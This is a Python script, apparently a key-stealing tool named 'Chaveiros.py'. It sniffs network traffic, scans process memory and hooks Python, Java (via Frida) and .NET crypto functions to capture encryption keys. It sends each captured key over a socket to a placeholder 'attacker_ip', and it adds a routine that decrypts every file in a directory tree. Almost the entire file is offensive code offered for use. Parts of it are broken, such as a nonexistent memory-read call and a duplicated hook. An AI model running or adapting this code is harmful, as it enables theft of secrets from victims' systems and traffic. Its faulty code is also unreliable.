# Chaveiros.py

import os
import re
import time
import base64
import socket
import threading
import ctypes
import psutil
import frida

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Define global variables for network communication
attacker_ip = 'your_attacker_ip'
attacker_port = 12345  # Replace with your desired port for receiving keys

# Utility function to send keys to the attacker
def send_to_attacker(key):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((attacker_ip, attacker_port))
            s.sendall(base64.b64encode(key))  # Encode the key as base64
    except Exception as e:
        print(f"Failed to send key to attacker: {e}")

# Network Sniffer for Encryption Keys
def setup_sniffer():
    from scapy.all import sniff, Raw
    def packet_callback(packet):
        if Raw in packet:
            data = packet[Raw].load
            # Basic pattern matching for encryption keys
            key_patterns = [b'key=', b'KEY=', b'cipher=', b'Cipher=']
            for pattern in key_patterns:
                if pattern in data:
                    key = re.findall(b'key=(\S+)', data)  # Extract keys from the data
                    if key:
                        send_to_attacker(key[0])

    # Start sniffing on the network interface
    iface = 'eth0'  # Replace with your network interface
    sniff(iface=iface, filter="tcp", prn=packet_callback, store=0)

# Memory Analysis and Key Extraction
def find_keys_in_memory():
    # Example patterns for different types of keys
    key_patterns = {
        'AES': re.compile(b'AES.*?\skey:\s([0-9A-Fa-f]{32})', re.DOTALL),
        'RSA': re.compile(b'-----BEGIN (PUBLIC|PRIVATE) KEY-----.*?-----END (PUBLIC|PRIVATE) KEY-----', re.DOTALL),
        # Add patterns for other types of keys if needed
    }

    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pid = proc.info['pid']
            proc_handle = ctypes.windll.kernel32.OpenProcess(0x0010, False, pid)  # PROCESS_VM_READ
            if not proc_handle:
                continue

            mem_ranges = [0x00000000, 0x7FFFFFFF]  # Example range (Adjust for target process)
            for start in mem_ranges:
                try:
                    mem_content = psutil.Process(pid).memory_read(start, 4096)
                    for key_type, pattern in key_patterns.items():
                        matches = pattern.findall(mem_content)
                        for match in matches:
                            send_to_attacker(match)
                except Exception as e:
                    print(f"Failed to read memory or find keys: {e}")

        except Exception as e:
            print(f"Failed to access process: {e}")

# Extendable Hooking for More Libraries
def hook_library():
    try:
        import cryptography.hazmat.primitives.ciphers as cryptography_ciphers
        from cryptography.hazmat.primitives.ciphers import Cipher as CryptographyCipher

        original_encrypt = CryptographyCipher.encrypt

        def hooked_encrypt(self, *args, **kwargs):
            key = self._key
            send_to_attacker(key)
            return original_encrypt(self, *args, **kwargs)

        CryptographyCipher.encrypt = hooked_encrypt

    except Exception as e:
        print(f"Failed to hook into cryptography library: {e}")

def hook_java_library():
    try:
        import frida

        def on_message(message, data):
            if message['type'] == 'send':
                send_to_attacker(base64.b64decode(data))

        script = """
        Java.perform(function() {
            var Cipher = Java.use('javax.crypto.Cipher');
            Cipher.doFinal.overload('[B').implementation = function(input) {
                var result = this.doFinal(input);
                send(result);  // Send the result to the Frida client
                return result;
            };
        });
        """
        device = frida.get_remote_device()  # Connect to a remote device
        session = device.attach('com.example.app')  # Adjust the target application
        script = session.create_script(script)
        script.on('message', on_message)
        script.load()
    except Exception as e:
        print(f"Failed to hook into Java library: {e}")

def extend_library_hooking():
    try:
        # Example for adding more hooks for libraries or encryption methods

        # Example for Python `cryptography` library
        from cryptography.hazmat.primitives.ciphers import Cipher as CryptographyCipher
        original_encrypt = CryptographyCipher.encrypt

        def hooked_encrypt(self, *args, **kwargs):
            key = self._key
            send_to_attacker(key)
            return original_encrypt(self, *args, **kwargs)

        CryptographyCipher.encrypt = hooked_encrypt

        # Example for .NET applications (C#)
        import clr
        clr.AddReference('System.Security.Cryptography')
        from System.Security.Cryptography import Aes
        original_aes_encrypt = Aes.Create().Encrypt

        def hooked_aes_encrypt(self, *args, **kwargs):
            key = self.Key
            send_to_attacker(key)
            return original_aes_encrypt(self, *args, **kwargs)

        Aes.Create().Encrypt = hooked_aes_encrypt

    except Exception as e:
        print(f"Failed to extend library hooking: {e}")

# Custom Memory Scanners for Specific Algorithms
def custom_memory_scanners():
    rsa_key_pattern = re.compile(b'-----BEGIN (PUBLIC|PRIVATE) KEY-----.*?-----END (PUBLIC|PRIVATE) KEY-----', re.DOTALL)
    
    def scan_rsa_keys():
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                pid = proc.info['pid']
                proc_handle = ctypes.windll.kernel32.OpenProcess(0x0010, False, pid)  # PROCESS_VM_READ
                if not proc_handle:
                    continue

                mem_ranges = [0x00000000, 0x7FFFFFFF]  # Example range (Adjust for target process)
                for start in mem_ranges:
                    try:
                        mem_content = psutil.Process(pid).memory_read(start, 4096)
                        matches = rsa_key_pattern.findall(mem_content)
                        for match in matches:
                            send_to_attacker(match)
                    except Exception as e:
                        print(f"Failed to read memory or find RSA keys: {e}")

            except Exception as e:
                print(f"Failed to access process: {e}")

    scan_rsa_keys()

# Kernel-Level Hooking (Conceptual, Requires Deep Expertise)
def kernel_level_hooking():
    # Placeholder for advanced techniques such as kernel-level hooking

    print("Kernel-level hooking involves advanced techniques and cannot be directly implemented in Python. Consider exploring kernel driver development for specific platforms.")
    
    # Example approaches (not implemented):
    # - Write a kernel driver to hook into system calls or kernel functions related to encryption
    # - Use existing frameworks and libraries (e.g., Windows Driver Kit for Windows, or kernel modules for Linux)

# Python Library for Key Extraction
def extract_keys_from_python():
    try:
        import frida
        def on_message(message, data):
            if message['type'] == 'send':
                send_to_attacker(base64.b64decode(data))

        script = """
        Java.perform(function() {
            var Cipher = Java.use('javax.crypto.Cipher');
            Cipher.doFinal.overload('[B').implementation = function(input) {
                var result = this.doFinal(input);
                send(result);  // Send the result to the Frida client
                return result;
            };
        });
        """
        device = frida.get_remote_device()  # Connect to a remote device
        session = device.attach('com.example.app')  # Adjust the target application
        script = session.create_script(script)
        script.on('message', on_message)
        script.load()
    except Exception as e:
        print(f"Failed to set up Frida for key extraction: {e}")

# Example Python Decryption Script for AES-256
def decrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC, iv=b'Your_16_byte_IV_Here')  # Replace with the correct IV
    with open(file_path, 'rb') as f:
        file_data = f.read()
    iv = file_data[:16]
    encrypted_data = file_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data

def decrypt_system(directory, key):
    files_to_decrypt = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            files_to_decrypt.append(os.path.join(root, file))
    
    for file in files_to_decrypt:
        try:
            decrypted_data = decrypt_file(file, key)
            with open(file, 'wb') as f:
                f.write(decrypted_data)
            print(f"Decrypted {file}")
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")

# Main function to start all components
def main():
    # Start the network sniffer in a separate thread
    sniffer_thread = threading.Thread(target=setup_sniffer)
    sniffer_thread.start()

    # Start the memory scanning for keys in a separate thread
    memory_scanner_thread = threading.Thread(target=find_keys_in_memory)
    memory_scanner_thread.start()

    # Setup Frida Java library hooking
    hook_java_library()

    # Extend library hooking for more libraries and encryption methods
    extend_library_hooking()

    # Setup custom memory scanners for specific algorithms
    custom_memory_scanners()

    # Optional: Start kernel-level hooking if you have the expertise
    kernel_level_hooking()

    # Optional: Extract keys from Python libraries
    extract_keys_from_python()

    # Ensure the threads are running
    sniffer_thread.join()
    memory_scanner_thread.join()

# Entry point of the script
if __name__ == "__main__":
    main()